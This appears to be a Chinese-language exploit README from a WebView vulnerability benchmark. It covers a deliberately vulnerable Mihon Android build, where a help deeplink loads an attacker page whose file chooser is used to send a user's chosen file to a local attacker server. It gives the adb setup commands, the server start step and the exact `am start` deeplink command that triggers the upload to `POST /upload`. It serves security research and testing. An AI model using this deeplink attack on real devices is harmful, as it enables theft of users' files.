# 3.1.1 Insecure File Selection Callback EXP

## 漏洞触发点

Mihon 帮助页 deeplink `mihon://help/webview?url=<external_url>` 将外部 URL 交给 `WebViewActivity`。漏洞样本的 `onShowFileChooser` 回调未限制文件选择范围、未校验发起页面来源，攻击页面可诱导用户选择任意敏感文件。

页面通过 `<input type="file">` 触发文件选择器，用户选择文件后 JS 读取为 `ArrayBuffer`，通过 `POST /upload` 回传至攻击服务器。

## 前置条件

1. 连接 MuMu 模拟器：

```powershell
adb connect 127.0.0.1:7555
```

2. 安装漏洞 APK（`apk/mihon-0.19.9/vuln/3.1.1.apk`）：

```powershell
adb -s 127.0.0.1:7555 install apk\mihon-0.19.9\vuln\3.1.1.apk
```

## 运行服务端

```powershell
cd "d:\Secsys\Webview Benchmark&自动化挖掘\Phrase 6\WebviewBench\exp\mihon-0.19.9\3.1.1_Insecure_File_Selection_Callback"
python .\server.py
```

服务端监听 `0.0.0.0:8000`，攻击页面路径：`http://10.0.2.2:8000/exp/3.1.1`

上传文件保存至 `received/` 目录。

## 触发 exploit

```powershell
adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW -d "mihon://help/webview?url=http%3A%2F%2F10.0.2.2%3A8000%2Fexp%2F3.1.1"
```

## 预期结果

WebView 加载攻击页面后显示文件选择按钮。用户在系统文件选择器中选择文件后，文件内容通过 `POST /upload` 回传至服务器，保存于 `received/` 目录。
